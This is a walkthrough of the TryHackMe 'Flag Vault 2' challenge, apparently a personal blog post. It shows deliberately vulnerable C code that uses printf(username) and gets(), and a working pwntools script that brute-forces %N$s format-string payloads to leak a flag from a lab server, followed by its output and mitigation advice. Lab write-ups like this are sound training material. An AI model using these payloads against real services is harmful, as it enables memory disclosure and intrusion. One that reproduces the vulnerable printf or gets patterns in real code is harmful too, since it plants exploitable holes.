---
title: "Flag Vault 2 CTF TryHackMe Walkthrough"
slug: flag-vault-2
layout: post
excerpt_separator: <!--more-->
categories:
  - ctfs
---

![](https://raw.githubusercontent.com/j4ke-exe/j4ke.io/refs/heads/main/assets/media/flag-vault-2-banner.jpg){: .center-image }

In this TryHackMe CTF challenge, [Flag Vault 2](https://tryhackme.com/room/hfb1flagvault2), our objective is to analyze and exploit a binary vulnerable to an f-string format attack. This vulnerability enables attackers to read arbitrary memory addresses or leak data on the stack by abusing the printf function without a format string.

<br>

## Step 1: Analyze Source Code

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
    printf( "  ______ _          __      __         _ _   \n"
        " |  ____| |         \\ \\    / /        | | |  \n"
        " | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
        " |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
        " | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
        " |_|    |_|\\__,_|\\__, | \\ / \\__,_|\\__,_|_|\\__|\n"
        "                  __/ |                      \n"
        "                 |___/                       \n"
        "                                             \n"
        "Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
        "==================================================================\n\n"
          );
}

void print_flag(char *username){
    FILE *f = fopen("flag.txt","r");
    char flag[200];

    fgets(flag, 199, f);
    //printf("%s", flag);

    printf("Hello, ");
    printf(username);
    printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
    printf("Yours truly,\nByteReaper\n\n");
}

void login(){
    char username[100] = "";

    printf("Username: ");
    gets(username);

    // The flag isn't printed anymore. No need for authentication
    print_flag(username);
}

void main(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // Start login process
    print_banner();
    login();

    return;
}
```

### Observations:
- The vulnerable function is `print_flag()`, which accepts an unsanitized user input (`username`) and passes it directly into `printf()`.
- `gets()` is also bad, considering it allows an attacker to input without bounds checking, which can result in a **buffer overflow**.
- The flag is stored in memory in a buffer called `flag`, but the actual call to `printf("%s", flag)` has been commented out. The idea is that the flag is in memory but inaccessible... or is it?

<br>

## Step 2: Understand the Vulnerability

### What's happening?

The `username` buffer is read using `gets()`--which has no bounds checking (insecure)--and is passed directly to `printf()`:

```c
printf(username);
```

This introduces a **format string vulnerability**, where if user input contains format specifiers (like `%x`, `%s`, `%n`, etc.), they are interpreted by `printf()`, resulting in unwanted behavior.

<br>

### Why is it vulnerable?

Passing user-controlled input directly into `printf()` without a format string leads to undefined behavior, allowing attackers to:

- Leak stack contents via `%x`/`%s`
- Write arbitrary memory using `%n`
- Control execution flow

In this case, the goal is to grab the flag string stored in memory. Since itâ€™s read with `fgets()` and stored in `char flag[200]`, we can try to leak stack positions where `flag` is located.

<br>

## Step 3: Exploit

Below is a simple Python script I wrote to brute-force stack positions with payloads like `%1$s`, resulting in leaking a stack position that contains the flag.

```python
import os
from pwn import *

TARGET_IP = '10.10.180.45'
TARGET_PORT = 1337

for i in range(1, 50):
    payload = f'%{i}$s'.encode()
    print(f'[+] Trying %{i}$s')
    r = remote(TARGET_IP, TARGET_PORT, timeout=5)
    r.recvuntil(b'Username:')
    r.sendline(payload)
    output = r.recvall(timeout=2).decode(errors='ignore')
    r.close()

    if 'THM{' in output:
        print(f'\nFound flag: {output}')
        break
    elif os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
```

### Output:
```
[+] Trying %5$s
[+] Opening connection to 10.10.214.114 on port 1337: Done
[+] Receiving all data: Done (145B)
[*] Closed connection to 10.10.214.114 port 1337

Found flag:  Hello, THM{REDACTED}
. Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...

Yours truly,
ByteReaper
```

<br>

### How does this work?

- `printf(username)` interprets `%5$s` as "read the 5th item on the stack as a pointer to a string".
- This is where the `flag` buffer resides in memory after being populated by `fgets()`.

<br>

## Step 4: Hotwash

### Format String Vulnerabilities

When user input is passed to `printf()` or similar functions **without a format string**, you expose yourself to:

- **Memory leaks** via `%s`, `%x`
- **Memory writes** via `%n`
- **Execution redirection** (advanced)

### Vulnerable Patterns

```c
printf(username);         // vulnerable
printf("%s", username);   // secure
```

Learn more: [OWASP Format String Vulnerabilities](https://owasp.org/www-community/attacks/Format_string_attack)

Regardless of whether you're printing a simple or complex string, always use an explicit format string to mitigate this attack vector.

<br>

## Room Created By
- [munra](https://tryhackme.com/p/munra)
- [hadrian3689](https://tryhackme.com/p/hadrian3689)
